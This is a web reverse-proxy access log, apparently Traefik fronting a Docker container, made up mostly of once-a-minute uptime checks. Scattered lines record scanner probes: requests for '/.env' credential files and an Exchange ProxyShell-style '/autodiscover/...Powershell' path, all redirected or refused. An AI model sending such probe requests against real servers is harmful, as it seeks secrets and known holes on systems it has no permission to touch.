159.203.109.206 - - [18/Dec/2023:23:24:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6950 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:24:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6951 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:23:25:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6952 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:23:25:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6953 "www@docker" "http://172.18.0.9:80" 0ms
2.56.247.167 - - [18/Dec/2023:23:25:36 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 6954 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:23:26:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6955 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:26:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6956 "www@docker" "http://172.18.0.9:80" 1ms
90.151.171.106 - - [18/Dec/2023:23:26:46 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 6957 "web-to-websecure@internal" "-" 0ms
90.151.171.106 - - [18/Dec/2023:23:26:57 +0000] "GET ?Z78354937572Q1 HTTP/1.1" 301 17 "-" "-" 6958 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:23:27:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6959 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:23:27:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6960 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:23:28:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6961 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:28:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6962 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:23:29:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6963 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:29:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6964 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:23:30:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6965 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:23:30:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6966 "www@docker" "http://172.18.0.9:80" 0ms
179.43.161.130 - - [18/Dec/2023:23:31:15 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 6967 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:23:31:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6968 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:31:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6969 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:23:32:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6970 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:32:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6971 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:23:33:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6972 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:23:33:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6973 "www@docker" "http://172.18.0.9:80" 5ms
192.155.88.231 - - [18/Dec/2023:23:34:02 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6974 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:23:34:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6975 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:34:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6976 "www@docker" "http://172.18.0.9:80" 0ms
172.104.11.34 - - [18/Dec/2023:23:34:38 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6977 "-" "-" 0ms
95.214.235.169 - - [18/Dec/2023:23:35:20 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 6978 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [18/Dec/2023:23:35:20 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 6979 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [18/Dec/2023:23:35:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6980 "www@docker" "http://172.18.0.9:80" 0ms
162.243.144.29 - - [18/Dec/2023:23:35:34 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 6981 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [18/Dec/2023:23:35:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6982 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:23:36:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6983 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:23:36:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6984 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:23:37:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6985 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:37:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6986 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:23:38:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6987 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:23:38:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6988 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:23:39:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6989 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:39:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6990 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:23:40:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6991 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:40:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6992 "www@docker" "http://172.18.0.9:80" 1ms
198.74.56.46 - - [18/Dec/2023:23:41:20 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6993 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:23:41:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6994 "www@docker" "http://172.18.0.9:80" 1ms
172.104.11.46 - - [18/Dec/2023:23:41:25 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 6995 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:23:41:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6996 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:23:42:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6997 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:42:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6998 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:23:43:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 6999 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:43:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7000 "www@docker" "http://172.18.0.9:80" 0ms
162.243.129.38 - - [18/Dec/2023:23:44:05 +0000] "GET /autodiscover/autodiscover.json?@zdi/Powershell HTTP/1.1" 404 19 "-" "-" 7001 "-" "-" 0ms
192.241.237.25 - - [18/Dec/2023:23:44:09 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7002 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:23:44:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7003 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:44:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7004 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:23:45:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7005 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:45:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7006 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:23:46:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7007 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:46:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7008 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:23:47:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7009 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:47:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7010 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:23:48:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7011 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:48:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7012 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:23:49:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7013 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:49:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7014 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:23:50:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7015 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:50:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7016 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:23:51:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7017 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:51:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7018 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:23:52:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7019 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:52:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7020 "www@docker" "http://172.18.0.9:80" 0ms
69.164.217.74 - - [18/Dec/2023:23:53:16 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7021 "-" "-" 0ms
159.203.109.206 - - [18/Dec/2023:23:53:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7022 "www@docker" "http://172.18.0.9:80" 0ms
45.79.172.21 - - [18/Dec/2023:23:53:24 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7023 "-" "-" 0ms
167.71.120.76 - - [18/Dec/2023:23:53:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7024 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:23:54:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7025 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:54:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7026 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:23:55:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7027 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:55:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7028 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:23:56:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7029 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:56:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7030 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:23:57:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7031 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:57:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7032 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [18/Dec/2023:23:58:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7033 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [18/Dec/2023:23:58:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7034 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [18/Dec/2023:23:59:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7035 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [18/Dec/2023:23:59:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7036 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:00:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7037 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:00:00:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7038 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:01:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7039 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:01:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7040 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:02:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7041 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:00:02:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7042 "www@docker" "http://172.18.0.9:80" 0ms
54.37.79.75 - - [19/Dec/2023:00:03:19 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 7043 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [19/Dec/2023:00:03:19 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 7044 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:00:03:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7045 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:03:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7046 "www@docker" "http://172.18.0.9:80" 2ms
159.203.109.206 - - [19/Dec/2023:00:04:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7047 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:04:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7048 "www@docker" "http://172.18.0.9:80" 1ms
143.110.222.166 - - [19/Dec/2023:00:05:18 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 7049 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:00:05:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7050 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:05:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7051 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:06:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7052 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:06:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7053 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:00:07:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7054 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:00:07:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7055 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:08:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7056 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:08:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7057 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:09:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7058 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:09:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7059 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:00:10:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7060 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:00:10:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7061 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:11:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7062 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:11:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7063 "www@docker" "http://172.18.0.9:80" 5ms
159.203.109.206 - - [19/Dec/2023:00:12:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7064 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:00:12:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7065 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:13:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7066 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:13:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7067 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:14:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7068 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:14:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7069 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:15:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7070 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:00:15:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7071 "www@docker" "http://172.18.0.9:80" 1ms
54.36.115.221 - - [19/Dec/2023:00:15:58 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 7072 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [19/Dec/2023:00:15:59 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 7073 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:00:16:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7074 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:16:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7075 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:00:17:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7076 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:17:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7077 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:00:18:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7078 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:00:18:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7079 "www@docker" "http://172.18.0.9:80" 0ms
43.134.79.204 - - [19/Dec/2023:00:18:43 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7080 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:00:19:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7081 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:19:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7082 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:20:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7083 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:20:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7084 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:21:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7085 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [19/Dec/2023:00:21:30 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 7086 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [19/Dec/2023:00:21:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7087 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:22:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7088 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:00:22:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7089 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:00:23:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7090 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:23:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7091 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:24:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7092 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:24:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7093 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:25:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7094 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:25:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7095 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:26:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7096 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:26:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7097 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:27:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7098 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:27:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7099 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:28:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7100 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:00:28:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7101 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:29:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7102 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:29:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7103 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:30:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7104 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:30:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7105 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:00:31:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7106 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:31:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7107 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:32:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7108 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:32:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7109 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:33:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7110 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:33:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7111 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:34:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7112 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:34:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7113 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:35:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7114 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:00:35:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7115 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:36:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7116 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:36:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7117 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:00:37:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7118 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:37:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7119 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:38:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7120 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:38:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7121 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:39:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7122 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:39:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7123 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:00:40:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7124 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:40:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7125 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:41:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7126 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:41:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7127 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:00:42:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7128 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:42:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7129 "www@docker" "http://172.18.0.9:80" 0ms
162.243.133.43 - - [19/Dec/2023:00:43:08 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7130 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:00:43:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7131 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:43:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7132 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:44:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7133 "www@docker" "http://172.18.0.9:80" 0ms
